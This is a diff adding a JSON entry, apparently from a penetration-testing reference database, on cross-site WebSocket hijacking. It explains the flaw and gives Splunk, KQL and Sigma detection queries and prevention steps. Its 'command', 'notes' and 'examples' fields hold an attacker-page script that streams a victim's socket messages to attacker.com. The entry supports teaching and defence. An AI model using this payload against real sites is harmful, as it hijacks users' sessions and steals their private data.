@@ -1,0 +1,106 @@
+{
+  "id": "web-websocket-hijacking",
+  "name": "Cross-Site WebSocket Hijacking (CSWSH)",
+  "command": "var ws = new WebSocket('wss://<target>/chat'); ws.onmessage = e => fetch('https://attacker.com/?'+btoa(e.data));",
+  "description": "A CSRF-equivalent against WebSockets: the server authenticates the WS handshake using only ambient cookies and does not validate the Origin header, so an attacker page opens a cross-site socket in the victim's authenticated context and reads/sends messages. Covers detecting a cookie-authenticated handshake with no Origin/CSRF check, the attacker-page PoC that exfiltrates streamed messages, and sending privileged commands over the hijacked socket.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Web",
+  "subcategory": "Client-Side",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "PortSwigger Web Security Academy - WebSockets",
+  "tags": [
+    "websocket",
+    "cswsh",
+    "csrf",
+    "origin",
+    "session-hijacking"
+  ],
+  "mitre": [
+    "T1190",
+    "T1539"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY IT WORKS ===\n  The WebSocket handshake is an HTTP Upgrade request. Browsers attach cookies to it automatically and do NOT enforce the same-origin policy on WebSocket connections. If the server authenticates purely on the session cookie and ignores Origin (and there is no CSRF token in the handshake), any site can open an authenticated socket for the victim.\n\n=== DETECT ===\n  1. In Burp, find a WS handshake: GET /chat HTTP/1.1 ... Upgrade: websocket, with a session Cookie and an Origin header.\n  2. Check: does the server reject a changed/removed Origin? Is there a per-handshake CSRF token? If not, it is likely vulnerable.\n\n=== ATTACKER-PAGE PoC (exfil streamed data) ===\n  <script>\n    var ws = new WebSocket('wss://<target>/chat');\n    ws.onopen = () => ws.send('READY');\n    ws.onmessage = e => fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));\n  </script>\n  Host this on attacker.com; when the authenticated victim visits, their chat history / tokens stream to you.\n\n=== SEND PRIVILEGED COMMANDS ===\n  - If the socket accepts actions (ws.send JSON commands), issue state-changing messages as the victim.\n\n=== TOOLING ===\n  - Burp Repeater has a WebSockets tab (edit/replay frames).\n  - Burp 'Generate CSRF PoC' does not cover WS; hand-write the HTML PoC above.\n  - Test Origin handling by replaying the handshake with Origin: https://attacker.com in Repeater.",
+  "examples": [
+    {
+      "label": "Minimal exfil PoC on attacker page",
+      "command": "var ws=new WebSocket('wss://<target>/chat'); ws.onmessage=e=>fetch('https://attacker.com/?'+encodeURIComponent(e.data));"
+    },
+    {
+      "label": "Replay the handshake with a foreign Origin (Repeater)",
+      "command": "GET /chat HTTP/1.1  ...  Origin: https://attacker.com   Upgrade: websocket"
+    },
+    {
+      "label": "Request history over the hijacked socket",
+      "command": "ws.onopen = () => ws.send('{\"action\":\"getHistory\"}');"
+    }
+  ],
+  "references": [
+    {
+      "title": "PortSwigger - WebSockets security (CSWSH)",
+      "url": "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking"
+    },
+    {
+      "title": "OWASP - Testing WebSockets",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets"
+    },
+    {
+      "title": "RFC 6455 - The WebSocket Protocol (Origin)",
+      "url": "https://datatracker.ietf.org/doc/html/rfc6455#section-10.2"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cors-misconfiguration",
+      "note": "Same cross-origin trust-boundary failure, different transport.",
+      "rel": "alternative"
+    },
+    {
+      "id": "web-postmessage-exploitation",
+      "note": "Another client-side origin-validation flaw to test on the same SPA.",
+      "rel": "next"
+    },
+    {
+      "id": "xss-cookie-stealer",
+      "note": "Once a socket exfils data, cookie/session theft chains the same way.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Browsers attach cookies to the WebSocket Upgrade handshake and do not apply the same-origin policy to WS. A server that authenticates on the cookie alone, with no Origin check and no per-handshake CSRF token, accepts a socket opened by any cross-site page in the victim's authenticated context.",
+    "prerequisites": "A cookie-authenticated WebSocket endpoint that does not validate Origin and has no CSRF token in the handshake, plus a victim with an active session who visits the attacker's page.",
+    "impact": "Read access to all data the socket streams (chat, notifications, tokens) and the ability to send privileged actions as the victim - full session-scoped compromise over the socket.",
+    "detection": "[MITRE T1539] WebSocket Upgrade requests whose Origin header does not match an allowed origin (or is absent) yet carry a valid session cookie, and WS sessions originating from referrers outside the app.",
+    "artifacts": "Reverse-proxy/web access logs of the /ws or /chat Upgrade request (Origin, Cookie, Referer headers, Upgrade: websocket), and application WS session logs.",
+    "splunk_spl": "index=web (uri_path=\"/chat\" OR uri_path=\"/ws\")\n| rex field=_raw \"Upgrade:\\s*websocket\"\n| rex field=_raw \"Origin:\\s*(?<origin>\\S+)\"\n| where isnull(origin) OR NOT match(origin, \"^https://(www\\.)?<target>$\")\n| stats count by clientip, origin, uri_path",
+    "elastic_kql": "url.path:(\"/chat\" or \"/ws\") and http.request.headers.upgrade:\"websocket\" and not http.request.headers.origin:\"https://<target>\"",
+    "sentinel_kql": "W3CIISLog\n| where csUriStem in (\"/chat\",\"/ws\")\n| extend origin = extract(@\"Origin:\\s*(\\S+)\", 1, csHeaders)\n| where isempty(origin) or origin !has \"<target>\"\n| summarize count() by cIP, origin",
+    "sigma_rules": "web_cross_site_websocket_hijacking_origin",
+    "prevention": "Validate the Origin header on the WebSocket handshake against a strict allow-list and reject mismatches. Add a per-handshake CSRF token (sent in the URL/subprotocol and verified server-side). Use SameSite cookies, short-lived tokens, and bind the socket to a token passed explicitly rather than ambient cookies.",
+    "sources": [
+      "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking",
+      "https://datatracker.ietf.org/doc/html/rfc6455#section-10.2"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "WebSocket handshake with foreign or missing Origin",
+        "logic": "index=web sourcetype=nginx (uri_path=\"/chat\" OR uri_path=\"/ws\")\n| rex field=_raw \"Upgrade:\\s*websocket\"\n| rex field=_raw \"Origin:\\s*(?<origin>\\S+)\"\n| where isnull(origin) OR NOT match(origin, \"^https://(www\\.)?<target>$\")\n| stats count by clientip, origin, uri_path",
+        "data_source": "nginx",
+        "attack": [
+          "T1539",
+          "T1190"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate native/mobile clients or server-to-server sockets that do not send a browser Origin.",
+        "tuning": "Allow-list expected origins and non-browser client fingerprints; alert on cookie-authenticated handshakes from unlisted origins."
+      }
+    ]
+  }
+}
